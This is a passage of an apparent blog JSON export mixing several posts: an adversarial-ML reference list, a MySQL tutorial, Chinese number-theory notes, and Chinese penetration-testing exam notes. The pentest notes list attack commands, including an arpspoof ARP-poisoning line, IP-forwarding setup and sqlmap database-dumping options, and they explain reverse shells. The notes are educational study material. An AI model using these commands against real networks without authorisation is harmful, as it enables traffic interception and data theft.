2015.[162] V. Mirjalili, and A. Ross, Soft Biometric Privacy: Retaining Biometric Utility of Face Images while Perturbing Gender, In International Joint Conference on Biometrics, 2017.[163] K. Simonyan and A. Zisserman, Very deep convolutional networks for largescale image recognition, in Proceedings of the International Conference on Learning Representations, 2015.[164] D. Krotov, and J.J. Hopfield, Dense Associative Memory for Pattern Recognition, In Advances in Neural Information Processing Systems, 2016.[165] R. Hahnloser, R. Sarpeshkar, M. A. Mahowald, R. J. Douglas, H.S. Seung, Digital selection and analogue amplification coexist in a cortex- inspired silicon circuit, Nature, vol. 405. pp. 947-951.[166] G. Hinton, O. Vinyals, and J. Dean, Distilling the knowledge in a neural network, in Deep Learning and Representation Learning Workshop at NIPS 2014. arXiv preprint arXiv:1503.02531, 2014.[167] H. Drucker, Y.Le Cun, Improving generalization performance using double backpropagation, IEEE Transactions on Neural Networks vol. 3, no. 6, pp. 991-997, 1992.[168] G. Huang, Z. Liu, K. Q. Weinberger, and L. Maaten, Densely connected convolutional networks, arXiv preprint arXiv:1608.06993, 2016.[169] A. N. Bhagoji, D. Cullina, C. Sitawarin, P. Mittal, Enhancing Robustness of Machine Learning Systems via Data Transformations, arXiv preprint arXiv:1704.02654, 2017.[170] Y. Dong, F. Liao, T. Pang, H. Su, X. Hu, J. Li, J. Zhu, Boosting Adversarial Attacks with Momentum, arXiv preprint arXiv:1710.06081, 2017.[171] I. Goodfellow, J. P. Abadie, M. Mirza, B. Xu, D. Warde-Farley, S. Ozair, A. Courville, and Y. Bengio, Generative adversarial nets, In Advances in neural information processing systems, pp. 2672-2680, 2014.[172] K. Jelena and C. Amina, An introduction to frames. Foundations and Trends in Signal Processing, 2008.[173] S. Rifai, P. Vincent, X. Muller, X. Glorot, and Y. Bengio, Contractive auto-encoders: Explicit invariance during feature extraction, In Proceed- ings of International Conference on Machine Learning, pp. 833 - 840, 2011.[174] S. S. Liew, M. Khalil-Hani, and R. Bakhteri, Bounded activation functions for enhanced training stability of deep neural networks on visual pattern recognition problems, Neurocomputing, vol. 216, pp. 718-734, 2016.[175] M. Abbasi, C. Gagne, Robustness to adversarial examples through an ensemble of specialists, arXiv preprint arXiv:1702.06856, 2017.[176] A. Mogelmose, M. M. Trivedi, and T. B. Moeslund, Vision-based traffic sign detection and analysis for intelligent driver assistance systems: Perspectives and survey, In IEEE Transaction on Intelligent Trans- portation Systems, vol. 13, no. 4, pp. 1484-1497, 2012.[177] A. Vedaldi and K. Lenc, MatConvNet – Convolutional Neural Networks for MATLAB, In Proceeding of the ACM International Conference on Multimedia, 2015.[178] J. Yangqing, E. Shelhamer, J. Donahue, S. Karayev, J. Long, R. Girshick, S. Guadarrama, T. Darrell, Caffe: Convolutional Architecture for Fast Feature Embedding, arXiv preprint arXiv:1408.5093, 2014.[179] M. Abadi, A. Agarwal, P. Barham, E. Brevdo, Z. Chen, C. Citro, G. S. Corrado, A. Davis, J. Dean, M. Devin, S. Ghemawat, I. Good- fellow, A. Harp, G. Irving, M. Isard, R. Jozefowicz, Y. Jia, L. Kaiser, M. Kudlur, J. Levenberg, D. Mane, M Schuster, R. Monga, S. Moore, D. Murray, C. Olah, J. Shlens, B. Steiner, I. Sutskever, K. Talwar, P. Tucker, V. Vanhoucke, V. Vasudevan, F. Viegas, O. Vinyals, P. Warden, M. Wattenberg, M. Wicke, Y. Yu, and X. Zheng, TensorFlow: Large-scale machine learning on heterogeneous systems, 2015. Software available from tensorflow.org.[180] A. Giusti, J. Guzzi, D. C. Ciresan, F. He, J. P. Rodriguez, F. Fontana, M. Faessler, A machine learning approach to visual perception of forest trails for mobile robots, IEEE Robotics and Automation Letters, vol. 1, no. 2, pp. 661 - 667, 2016.[181] Objects Detection Machine Learning TensorFlow Demo, https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id&#x3D;org.tensorflow. detect&amp;hl&#x3D;en, Accessed December 2017.[182] Class central, Deep Learning for Self-Driving Cars, https:&#x2F;&#x2F;www.class- central.com&#x2F;mooc&#x2F;8132&#x2F; 6- s094- deep- learning- for- self- driving- cars, Accessed December 2017.[183] C. Middlehurst, China unveils world’s first facial recognition ATM, http:&#x2F;&#x2F;www.telegraph.co.uk&#x2F;news&#x2F;worldnews&#x2F;asia&#x2F;china&#x2F; 11643314&#x2F;China-unveils-worlds-first-facial-recognition-ATM. html, 2015.[184] About Face ID advanced technology, https:&#x2F;&#x2F;support.apple. com&#x2F;en-au&#x2F;HT208108, Accessed December 2017.[185] M. Sharif, S. Bhagavatula, L. Bauer, and M. K. Reiter, Accessorize to a crime: Real and stealthy attacks on state-of-the-art face recognition, In Proceedings of ACM SIGSAC Conference on Computer and Communications Security, pp. 1528-1540, 2016.[186] R. Shin and D. Song, JPEG-resistant adversarial images, In MAchine LEarning and Computer Security Workshop, 2017.[187] W. Brendel and M. Bethge Comment on ”Biologically inspired protection of deep networks from adversarial attacks”, arXiv preprint arXiv:1704.01547, 2017.[188] N. Carlini, D. Wagner, MagNet and ”Efficient Defenses Against Adversarial Attacks” are Not Robust to Adversarial Examples, arXiv preprint arXiv:1711.08478, 2017.[189] A. Raghunathan, J. Steinhardt, P. Liang, Certified Defenses against Adversarial Examples, arXiv preprint arXiv:1801.09344. 2018.[190] V. Khrulkov and I. Oseledets, Art of singular vectors and universal adversarial perturbations, arXiv preprint arXiv:1709.03582, 2017. [191] X. Huang, M. Kwiatkowska, S. Wang, M. Wu, Safety Verificationof Deep Neural Networks, In 29th International Conference on Com-puter Aided Verification, pages 3-29, 2017.[192] M. Wicker, X. Huang, and M. Kwiatkowska, Feature-Guided Black-Box Safety Testing of Deep Neural Networks, In 24th International Conference on Tools and Algorithms for the Construction and Analysis of Systems, 2018.[193] K. R. Mopuri, U. Ojha, U. Garg, V. Babu, NAG: Network for Adversary Generation, arXiv preprint arXiv:1712.03390, 2017.[194] A. G. Ororbia II, C. L. Giles and D Kifer, Unifying Adversarial Training Algorithms with Flexible Deep Data Gradient Regularization, arXiv preprint arXiv:1601.07213, 2016.[195] Y. Yoo, S. Park, J. Choi, S. Yun, N. Kwak, Butterfly Effect: Bidirectional Control of Classification Performance by Small Additive Perturbation, arXiv preprint arXiv:1711.09681, 2017. 1","categories":[],"tags":[{"name":"神经对抗攻击","slug":"神经对抗攻击","permalink":"http://example.com/tags/%E7%A5%9E%E7%BB%8F%E5%AF%B9%E6%8A%97%E6%94%BB%E5%87%BB/"}]},{"title":"SQL Learning","slug":"SQL-Learning","date":"2021-01-12T06:00:19.000Z","updated":"2021-01-21T13:54:24.873Z","comments":true,"path":"2021/01/12/SQL-Learning/","link":"","permalink":"http://example.com/2021/01/12/SQL-Learning/","excerpt":"Mysql tutorial for beginners ¶Creating the Databases ¶The LIKE Operator Get all the custmers who’s patterns start with b/B 123SELECT *FROM customersWHERE last_name LIKE &#x27;b%&#x27; get all the custmers who’s last name start with brush 123SELECT *FROM customersWHERE last name LIKE &#x27;brush%&#x27; don’t care about the first character but the second character is y 123SELECT *FROM customersWHERE last name LIKE &#x27;_y&#x27; % : any number of characters _ : single character EXERCISE Get the customers whose addresses contain TRAIL or AVENUE 1234SELECT * FROM customersWHERE addresses LIKE &#x27;%trail%&#x27; OR addresses LIKE &#x27;%avenue%&#x27; Phone numbers end with 9 123SELECT *FROM customersWHERE phone LIKE &#x27;%9&#x27;","text":"Mysql tutorial for beginners ¶Creating the Databases ¶The LIKE Operator Get all the custmers who’s patterns start with b/B 123SELECT *FROM customersWHERE last_name LIKE &#x27;b%&#x27; get all the custmers who’s last name start with brush 123SELECT *FROM customersWHERE last name LIKE &#x27;brush%&#x27; don’t care about the first character but the second character is y 123SELECT *FROM customersWHERE last name LIKE &#x27;_y&#x27; % : any number of characters _ : single character EXERCISE Get the customers whose addresses contain TRAIL or AVENUE 1234SELECT * FROM customersWHERE addresses LIKE &#x27;%trail%&#x27; OR addresses LIKE &#x27;%avenue%&#x27; Phone numbers end with 9 123SELECT *FROM customersWHERE phone LIKE &#x27;%9&#x27; ¶The REGEXP Operator REGEXP: regular expression REGEXP is similar with LIKE Get all the customers who’s last name start with field 123SELECT *FROM customersWHERE last_name REGEXP &#x27;^field&#x27; Get all the customers who’s last name end with field 123SLECT * FROM customersWHERE last_name REGEXP &#x27;field$&#x27; Get all the customers who have words field,mac or rose in their last name 123SELECT *FROM customersWHERE last_name REGEXP &#x27;field|mac|rose&#x27; Get all the customers who have words ge,me or ie in their last name 123SELECT *FROM customersWHERE last_name REGEXP &#x27;[gim]e&#x27; ^ beginning $ end | logical or [abcd] [a-f] EXERCISE GET the customers whose first names are ELKA or AMBUR 123SELECT * FROM custmoersWHERE first_name REGEXP &#x27;elka|ambur&#x27; last names end with EY or ON 123SELECT *FROM customersWHERE last_name REGEXP &#x27;ey$|on$&#x27; Last names start with MY or contains SE 123SELECT *FROM customersWHERE last_name REGEXP &#x27;^my|se&#x27; last name contain B followed by R or U 123SELECT *FROM customersWHERE last_name REGEXP &#x27;b[ru]&#x27; ¶The IS NULL Operator search who does not have a phone 123SELECT *FROM customersWHERE phone IS NULL EXERCISE get the orders that are not shipped 123SEARCH *FROM ordersWHERE shipped_date IS NULL ¶The ORDER BY Clause In this tutor I’m going to show you how to sort data in your sequel queries Search customers order by first_name 123SELECT *FROM customersORDER BY first_name or you want to reverse the sort order 123SELECT *FROM customersORDER BY first_name DESC sort by multiple columns, for example 123SELECT *FROM customersORDER BY state,first_name; ¶The LIMIT Caluse get the first 3 customers 123SELECT *FROM customersLIMIT 300; Get customers form 6-9 123SELECT *FROM customersLIMIT 6,3; 6 is an offset, and 3 means the step EXERCISE Get the top three loyal customers 1234SELECT *FROM customersORDER BY points DESCLIMIT 3; ¶The Inner loins JOIN is equal with INNER JOIN , we don’t have to type it. you can use JOIN to catch the relation between to tables; For example, you want to search orders which have the same customer_id in table CUSTOMERS from the table ORDERS. 1234SELECT *FROM ordersJOIN customers ON orders.customer_id = customers.customer_id we can use alias to simplify the query. 1234SELECT *FROM orders oJOIN customers c ON o.customer_id = c.customer_id if we use o as the orders’s alias , we can’t write orders to instead o in the next. ¶Joining Across Databases how to combine columns from tables in multiple databases ? Using database combines with sql_inventory database. 1234SELECT *FROM order_items oiJOIN sql_inventory.products p ON oi.product_id = p.product_id; the query will be different depending on the database ¶Self Joins In sql we can join tables with itself. In database sql_hr we have a table named employees. Now we need select each employee and their manager. 123456USE sql_hr;SELECT *FROM employees eJOIN employees m On e.reports_to = m.employee_id ¶Joining Multiple Tables 1234567891011SELECT o.order_id, o.order_data, c.first_name, c.last_name, os.name AS statusFROM order oJOIN customers c ON o.customers_id = c.customer_idJOIN order_statuses os ON o.status = os.order_status_id Exercise In database sql_invoicing we have this table, payments and these are the payments that each client has made towards either invoice. We also have a table named payment_methods. Write a query that join the payments with the payment methods tables as well as the clients table.Produce a report that shows the payments, with more details, such as the name of the client and the payment method. 1234567891011SELECT p.data, p.invoice_id, p.amount, c.name, pm.name,FROM payments pJOIN clients c ON p.client_id = c.client_idJOIN payment_methods pm ON p.payment_method = pm.payment_method_id ¶Compound Join Conditions we have mutiple conditions to join these two tables e.g. 12345SELECT * FROM order_items oiJOIN oder_item_notes oin ON oi.order_id = oin.order_id AND oi.product_id = oin.product_id; ¶Implicit Join Syntax In Mysql we can use simple query to instead Join condition. for example 123456789SELECT *FROM orders oJOIN customers c ON o.customer_id = c.customer_id -- Implpicit Join SyntaxSELECT *FROM orders o,customers cWHERE o.customer_id = c.customer_id ¶Outer Join","categories":[],"tags":[]},{"title":"【信息安全数学基础】二次同余式与平方剩余","slug":"【信息安全数学基础】二次同余式与平方剩余","date":"2020-12-10T11:42:31.000Z","updated":"2020-12-23T13:34:21.291Z","comments":true,"path":"2020/12/10/【信息安全数学基础】二次同余式与平方剩余/","link":"","permalink":"http://example.com/2020/12/10/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E3%80%91%E4%BA%8C%E6%AC%A1%E5%90%8C%E4%BD%99%E5%BC%8F%E4%B8%8E%E5%B9%B3%E6%96%B9%E5%89%A9%E4%BD%99/","excerpt":"¶平方剩余(二次剩余) （a，m）= 1，x2≡ a mod mx^2\\equiv \\ a\\ mod\\ mx2≡ a mod m有解，则a叫模m的平方剩余；P125 ¶欧拉判别定理 如何快速的判断某个数是否是模p的平方剩余； x2≡ a mod px^2\\equiv\\ a\\ mod\\ px2≡ a mod p 且（a，p）= 1，p ！=2，如若ap−12≡ 1 mod pa^{\\frac{p-1}{2} }\\equiv\\ 1\\ mod\\ pa2p−1​≡ 1 mod p,（等价）则a是模p的平方剩余，且x有两个解，反之，对于ap−12≡ −1 mod pa^{\\frac{p-1}{2} }\\equiv\\ -1\\ mod\\ pa2p−1​≡ −1 mod p，（等价）则a是模p的平方非剩余 P129","text":"¶平方剩余(二次剩余) （a，m）= 1，x2≡ a mod mx^2\\equiv \\ a\\ mod\\ mx2≡ a mod m有解，则a叫模m的平方剩余；P125 ¶欧拉判别定理 如何快速的判断某个数是否是模p的平方剩余； x2≡ a mod px^2\\equiv\\ a\\ mod\\ px2≡ a mod p 且（a，p）= 1，p ！=2，如若ap−12≡ 1 mod pa^{\\frac{p-1}{2} }\\equiv\\ 1\\ mod\\ pa2p−1​≡ 1 mod p,（等价）则a是模p的平方剩余，且x有两个解，反之，对于ap−12≡ −1 mod pa^{\\frac{p-1}{2} }\\equiv\\ -1\\ mod\\ pa2p−1​≡ −1 mod p，（等价）则a是模p的平方非剩余 P129 ¶Legendre（勒让德） 用于帮忙判断同余式是否有解 对于同余式：x2≡a(mod p)x^2 \\equiv a(mod \\ p)x2≡a(mod p); (ap)={1,若a是模p的平方剩余−1,若a是模p的平方非剩余0,若p|a\\left(\\frac{a}{p}\\right)=\\begin{cases}1,&amp;\\text{若a是模p的平方剩余}\\\\-1,&amp;{若a是模p的平方非剩余}\\\\0,&amp;\\text{若p|a}\\end{cases} (pa​)=⎩⎪⎪⎨⎪⎪⎧​1,−1,0,​若a是模p的平方剩余若a是模p的平方非剩余若p|a​ 如果p是奇素数，那么还有如下的性质： (1p)=1\\left(\\frac{1}{p}\\right)=1 (p1​)=1 (−1p)=(−1)p−12\\left(\\frac{-1}{p}\\right)=(-1)^{\\frac{p-1}{2}} (p−1​)=(−1)2p−1​ (2p)=(−1)p2−18\\left(\\frac{2}{p}\\right)=(-1)^{\\frac{p^2-1}{8}} (p2​)=(−1)8p2−1​ 一些运算性质： ( i ) (a+pp)=(ap)\\left(\\frac{a+p}{p}\\right) = \\left(\\frac{a}{p}\\right)(pa+p​)=(pa​) 周期性 ( ii ) (a⋅bp)=(ap)(bp)\\left(\\frac{a \\cdot b}{p}\\right) = \\left(\\frac{a}{p}\\right)\\left(\\frac{b}{p}\\right)(pa⋅b​)=(pa​)(pb​) ¶勒让德符号的性质： 周期性：(a+pp)=(ap)\\left(\\frac{a+p}{p}\\right)=\\left(\\frac{a}{p}\\right)(pa+p​)=(pa​) 完全可乘性：(a∗bp)=(ap)∗(bp)\\left(\\frac{a*b}{p}\\right)=\\left(\\frac{a}{p}\\right)*\\left(\\frac{b}{p}\\right)(pa∗b​)=(pa​)∗(pb​) (a2p)=1,(a,p)=1\\left(\\frac{a^2}{p}\\right)=1,(a,p)=1(pa2​)=1,(a,p)=1 ¶高斯引理(不用记）：p是奇素数，a是整数，（a，p）=1，如果整数a1，a2，…a*（p-1）/2中模p的最小正剩余大于p/2的个数是m，则有(ap)=(−1)m\\left(\\frac{a}{p}\\right)=(-1)^m(pa​)=(−1)m P134 ¶超级重要的二次互反律 p,q是互素的奇素数，则(pq)=(−1)p−12∗q−12(qp)\\left(\\frac{p}{q}\\right)=(-1)^{\\frac{p-1}{2}*\\frac{q-1}{2}}\\left(\\frac{q}{p}\\right)(qp​)=(−1)2p−1​∗2q−1​(pq​) P137 ¶雅克比符号 勒让德符号的扩展，(am)=(ap1)...(apr)\\left(\\frac{a}{m}\\right)=\\left(\\frac{a}{p_1}\\right)...\\left(\\frac{a}{p_r}\\right)(ma​)=(p1​a​)...(pr​a​),m=p1...prm=p_1...p_rm=p1​...pr​是奇素数的乘积。二次同余式x2≡ a mod mx^2\\equiv\\ a\\ mod\\ mx2≡ a mod m有解可以(单向)推出(am)=1\\left(\\frac{a}{m}\\right)=1(ma​)=1，(am)=−1\\left(\\frac{a}{m}\\right)=-1(ma​)=−1可以（单向）推出无解；P143 雅克比符号性质与勒让德符号一致 P143 二次互反也一样，只是p，q必须是奇数； 一些与雅克比有关的重要式子：也是和勒让德一样，只要限制条件是p不在局限于奇素数，而是奇数 P144 (1m)=1\\left(\\frac{1}{m}\\right)=1 (m1​)=1 (−1m)=(−1)m−12\\left(\\frac{-1}{m}\\right)=(-1)^{\\frac{m-1}{2}} (m−1​)=(−1)2m−1​ (2m)=(−1)m2−18\\left(\\frac{2}{m}\\right)=(-1)^{\\frac{m^2-1}{8}} (m2​)=(−1)8m2−1​ 雅可比和勒让德一些不同的点： . 雅可比中上单向的箭头，这里是需要注意一下的 下面放一个大致整理图来的图：","categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"}]},{"title":"【白帽子学习笔记】加油NPT","slug":"【白帽子学习笔记】加油NPT","date":"2020-12-06T13:03:30.000Z","updated":"2020-12-14T03:51:20.770Z","comments":true,"path":"2020/12/06/【白帽子学习笔记】加油NPT/","link":"","permalink":"http://example.com/2020/12/06/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E5%8A%A0%E6%B2%B9NPT/","excerpt":"【白帽子学习笔记】加油NPT 考试复习内容，看到这篇博客的小伙伴要加油啊！冲冲冲！ ¶0x01 PETS标准 整个渗透测试过程大致可以分为7个阶段： 前期与客户的交流阶段：确认是对目标的哪些设备和哪些问题进行测试，商讨过程中的主要因素有如下几个： 渗透测试的目标 进行渗透测试所需要的条件 渗透测试过程中的限制条件 渗透测试过程的工期 渗透测试费用 渗透测试过程的预期目标 情报的收集阶段：使用各种资源尽可能地获得要测试目标的相关信息 被动扫描 主动扫描 威胁建模阶段：这个阶段主要解释了如下的问题 哪些资产所目标中的重要资产 攻击时采用的技术和手段 哪些群里可能会对目标系统造成攻击 这些群体会使用哪些方法进行破坏 漏洞分析阶段 漏洞利用阶段 后渗透攻击阶段：尽可能地将目标被渗透后所可能产生的后果模拟出来，来给客户展示当前网络存在的问题会带来的风险 控制权限的提升 登录凭证的窃取 重要信息的获取 利用目标作为跳板 建立长期的控制通道 报告阶段","text":"【白帽子学习笔记】加油NPT 考试复习内容，看到这篇博客的小伙伴要加油啊！冲冲冲！ ¶0x01 PETS标准 整个渗透测试过程大致可以分为7个阶段： 前期与客户的交流阶段：确认是对目标的哪些设备和哪些问题进行测试，商讨过程中的主要因素有如下几个： 渗透测试的目标 进行渗透测试所需要的条件 渗透测试过程中的限制条件 渗透测试过程的工期 渗透测试费用 渗透测试过程的预期目标 情报的收集阶段：使用各种资源尽可能地获得要测试目标的相关信息 被动扫描 主动扫描 威胁建模阶段：这个阶段主要解释了如下的问题 哪些资产所目标中的重要资产 攻击时采用的技术和手段 哪些群里可能会对目标系统造成攻击 这些群体会使用哪些方法进行破坏 漏洞分析阶段 漏洞利用阶段 后渗透攻击阶段：尽可能地将目标被渗透后所可能产生的后果模拟出来，来给客户展示当前网络存在的问题会带来的风险 控制权限的提升 登录凭证的窃取 重要信息的获取 利用目标作为跳板 建立长期的控制通道 报告阶段 ¶0x02 ethical hacking的意义 ¶0x03 Kali基础 ¶1x01 NAT和桥接的区别 桥接模式：在桥接模式下，VMWare虚拟出来的操作系统就像是局域网中的一台独立的主机（主机和虚拟机处于对等地位），它可以访问网内任何一台机器。在桥接模式下，我们往往需要为虚拟主机配置ＩＰ地址、子网掩码等（注意虚拟主机的iｐ地址要和主机ｉｐ地址在同一网段）。使用桥接模式的虚拟系统和主机的关系，就如同连接在一个集线器上的两台电脑；要让他们通讯就需要为虚拟系统配置ip地址和子网掩码。如果我们需要在局域网内建立一个虚拟服务器，并为局域网用户提供服务，那就要选择桥接模式。 NAT：是Network Address Translation的缩写，意即网络地址转换。使用NAT模式虚拟系统可把物理主机作为路由器访问互联网，NAT模式也是VMware创建虚拟机的默认网络连接模式。使用NAT模式网络连接时，VMware会在主机上建立单独的专用网络，用以在主机和虚拟机之间相互通信**。虚拟机向外部网络发送的请求数据’包裹’，都会交由NAT网络适配器加上’特殊标记’并以主机的名义转发出去**，外部网络返回的响应数据’包裹’，也是先由主机接收，然后交由NAT网络适配器根据’特殊标记’进行识别并转发给对应的虚拟机，因此，虚拟机在外部网络中不必具有自己的IP地址。**从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。**此外，在一台主机上只允许有一个NAT模式的虚拟网络。因此，同一台主机上的多个采用NAT模式网络连接的虚拟机也是可以相互访问的。 ¶1x02 基本操作 ifconfig：查看IP信息 netstat -r：查看网关 如何判断两台主机时候在同一网段？ 将两台主机的IP分别与子网掩码进行与运算，比较运算结果是否相同； ¶0x04 被动扫描 ¶1x01 什么是被动扫描？ 主要指的是在目标无法察觉的情况下进行的信息收集 目标网站的所有者信息，例如：姓名、地址、电话、电子邮件等 目标网站的电子邮箱 目标网站的社交信息：QQ、微博、微信、论坛发帖等 ¶1x02 zoomeye ZoomEye是一款针对网络空间的搜索引擎，收录了互联网空间中的设备、网站及其使用的服务或组件等信息。 ¶1x03 Google Hacking site ： 指定域名 inurl：url存在关键字的网页 intext：网页正文中的关键字 filetype：指定文件类型 intitle：网页标题中的关键字 ¶0x05 主动扫描 主动扫描的范围要小得多。主动扫描一般都是针对目标发送特制的数据包，然后根据目标的反应来获得一些信息。这些信息主要包括目标主机是否在线、目标主机的指定端口是否开放、目标主机的操作系统、目标主机上运行的服务等。 ¶NMAP的应用 扫描操作系统: nmap -O IP 判断所在网络存活主机： 扫描192.168.0.0/24网段上有哪些主机的存活的 nmap -sP 192.168.0.0/24 扫描主机开放了哪些端口： TCP端口扫描：scan tcp nmap -sT IP UDP端口扫描：scan udp nmap -sU IP 扫描全部端口： nmap-p &quot;*&quot; ip 扫描前n的端口： nmap-top-ports n IP 扫描指定的端口： nmap -P IP 扫描目标开启了哪些服务： nmap -sV IP 将扫描结果保存为xml文件： nmap -oX a.xml IP ¶0x06 身份认证攻击 ¶1x01 BurpSuite 主要需要知道一个作用就是Proxy： 拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。 其他常用的功能还有： Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。 Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。 Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。 Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。 ¶如何设置安全的密码？ 避开若口令 能记住的密码才是好密码 密码中包含数字，大小写英文 增加密码的长度 每个应用的密码都设置的具有一定差异 ¶0x07 网络数据嗅探与欺骗 ¶1x01 如何利于Wireshark恢复数据流中的文件 利用WireShark的包筛选去筛选出需要的包 ==&gt; 跟踪数据流 ==&gt; 找到需要的数据，选择原数据进行保存 常用的WireShark语句： tcp：tcp流； http：http数据流； http.request.method：筛选HTTP数据流的请求方式； ip.src：对于数据源地址进行筛选 ip.dst：对于目的地址筛选 ¶1x02 arpspoof 开启端口转发，允许本机像路由器那样转发数据包 echo 1 &gt; /proc/sys/net/ipv4/ip_forward ARP投毒 arpspoof -i eth0 -t IP1 IP2(IP1是我们的攻击目标、IP2是网关IP地址) -i eth0表示选择eth0这个网卡； ARP攻击原理： 在局域网内的攻击方式主要有两种： . (1) PC1：PC2不断的向PC1发送欺骗包，欺骗其为网关路由，最后导致PC1的ARP表遭到攻击； (2) Route：PC2不断的向Route(网关路由)发送欺骗包，欺骗其为PC1； 因为arp欺骗想把原理写明白需要很大的篇幅，这里就不细说了 ¶0x08 远程控制 ¶1x01 正向连接和反向连接的区别 反向连接：攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经连接。 正向连接：攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入。 ¶1x02 反向连接的实施过程 攻击者先通过某个手段在目标机器上植入恶意代码，并且该代码可以被触法。攻击者设置一个端口和一个IP，当被攻击者执行了恶意代码后攻击者的机器就会获取被攻击者的代码。 ¶0x09 漏洞扫描 ¶1x01 工具们 工具： AWVS：漏洞扫描工具 Beef：XSS漏洞利用工具 SQLMAP：自动话sql注入工具： 查询当前数据库：sqlmap -u &quot;IP&quot; --cookie &quot;xxx&quot; --current-db 查询当前使用者：--current user 爆破数据表：-D xx --tables 爆破数据表表头：-D xx -T xx --columns 爆破具体的列：-D xx -T xx -C xx Whatweb: 查询网页的基本信息 whatweb IP Wpscan:可以扫描WordPress中的多种安全漏洞 Dirb：爆破用 dirb -u http://IP MeterSploit:功能非常强大的渗透工具 ¶1x02 XSS攻击/SQL注入 **XSS攻击：**XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 SQL注入攻击的原理：恶意用户在提交查询请求的过程中将SQL语句插入到请求内容中，同时程序本身对用户输入内容过分信任而未对恶意用户插入的SQL语句进行过滤，导致SQL语句直接被服务端执行。 ¶0x10 OWASP TOP 10 Injection. Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can trick the interpreter into executing unintended commands or accessing data without proper authorization. Broken Authentication. Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently. Sensitive Data Exposure. Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII. Attackers may steal or modify such weakly protected data to conduct credit card fraud, identity theft, or other crimes. Sensitive data may be compromised without extra protection, such as encryption at rest or in transit, and requires special precautions when exchanged with the browser. XML External Entities (XXE). Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks. Broken Access Control. Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc. Security Misconfiguration. Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched/upgraded in a timely fashion. Cross-Site Scripting XSS. XSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. XSS allows attackers to execute scripts in the victim’s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites. Insecure Deserialization. Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not result in remote code execution, they can be used to perform attacks, including replay attacks, injection attacks, and privilege escalation attacks. Using Components with Known Vulnerabilities. Components, such as libraries, frameworks, and other software modules, run with the same privileges as the application. If a vulnerable component is exploited, such an attack can facilitate serious data loss or server takeover. Applications and APIs using components with known vulnerabilities may undermine application defenses and enable various attacks and impacts. Insufficient Logging &amp; Monitoring. Insufficient logging and monitoring, coupled with missing or ineffective integration with incident response, allows attackers to further attack systems, maintain persistence, pivot to more systems, and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties rather than internal processes or monitoring.","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]},{"title":"【信息安全数学基础】同余式","slug":"【信息安全数学基础】同余式","date":"2020-12-06T03:32:21.000Z","updated":"2021-01-02T14:39:50.134Z","comments":true,"path":"2020/12/06/【信息安全数学基础】同余式/","link":"","permalink":"http://example.com/2020/12/06/%E3%80%90%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E3%80%91%E5%90%8C%E4%BD%99%E5%BC%8F/","excerpt":"【信息安全数学基础】同余式 可以简单点理解为上一章学习的同余的概念中混入了x（手动滑稽） ¶同余式的基本概念 什么是同余式？ 设m是一个正整数，f（x）为多项式； f(x)=anxn+⋅⋅⋅+a1x+a0f(x) = a_nx^n + \\cdot \\cdot \\cdot +a_1x +a_0 f(x)=an​xn+⋅⋅⋅+a1​x+a0​ 其中ai为a_i为ai​为整数，则： f(x)≡0(mod n)f(x) \\equiv 0(mod \\ n) f(x)≡0(mod n) 叫做模m的同余式，如果an≢0(mod m)a_n \\not\\equiv 0(mod \\ m)an​​≡0(mod m),则n叫做f(x)的次数，记作degf. 如果整数x=a满足： f(a)≡0(mod 